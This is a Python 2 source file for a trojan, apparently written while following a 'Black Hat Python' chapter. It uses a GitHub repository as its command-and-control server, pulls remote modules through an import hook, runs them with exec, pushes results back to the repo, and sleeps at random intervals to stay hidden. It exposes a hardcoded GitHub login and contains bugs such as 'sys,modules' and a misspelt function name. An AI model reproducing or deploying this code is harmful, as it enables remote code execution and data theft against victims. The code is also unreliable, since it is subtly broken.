import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

trojan_id = "abc" #Set id for the trojan.

trojan_config = "%s.json" % trojan_id #Name of configuration file to control trojan.

data_path = "data/%s/" % trojan_id

trojan_modules = []

configured = False #Switch this to True once trojan is configured.

task_queue = Queue.Queue()

class GitImporter(object):

    def __init__(self):
        self.current_module_code = ""

    def find_module(self,fullname,path=None):

        if configured:
            print '[*] Attempting to retrieve %s' % fullname
            new_library = get_file_contents('modules/%s' % fullname)

            if new_library is not None:
                #Decode current module code and store in variable.
                self.current_module_code = base64.b64encode(new_library)
                return self
            return None
        
        return None

    def load_module(self,name):
        #Create new module to put new code in.
        module = imp.new_module(name)
        
        #Put new code into created module.
        exec self.current_module_code in module.__dict__


        #Put new module into modules list.
        sys,modules[name] = module

        return module


def connect_to_github():

    #Create github object with login details.
    gh = login(username = "markthorne159", password = "MarkGit_@159_@Dev")

    #Choose repository to open.
    repo = gh.repository("markthorne159","BlackhatChapter7")

    #Get branch that trojan is located in.
    branch = repo.branch("master")

    return gh,repo,branch

def get_file_contents(filepath):
    gh,repo,branch = connect_to_github()

    tree = branch.commit.commit.tree.to_tree().recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print "[*]Found file %s" % filepath

            blob = repo.blob(filename._json_data['sha']) #Create a blob.

            return blob.content #Return the content of created blob.

    return None

def get_trojan_config():

    global configured

    config_json = get_file_contents(trojan_config)

    config = json.loads(base64.b64decode(config_json))

    configured = True

    for task in config:
        #If module set in task is not available,
        #Import module.
        
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])


    return config

def store_module_result(data):

    gh,repo,branch = connect_to_githhub()

    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,10000))

    repo.create_file(remote_path,"Commit message",base64.b64encode(data))

    return


def module_runner(module):

        task_queue.put(1)
        result = sys,module[module].run()
        task_queue.get()

        #Store the result of the task in the repo.
        store_module_result(result)

        return

#Main loop for the trojan.
sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_trojan_config()

        for task in config:
            t = threading.Thread(target=module_runner,args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))

        time.sleep(random.randint(1000,10000))

        
            
    



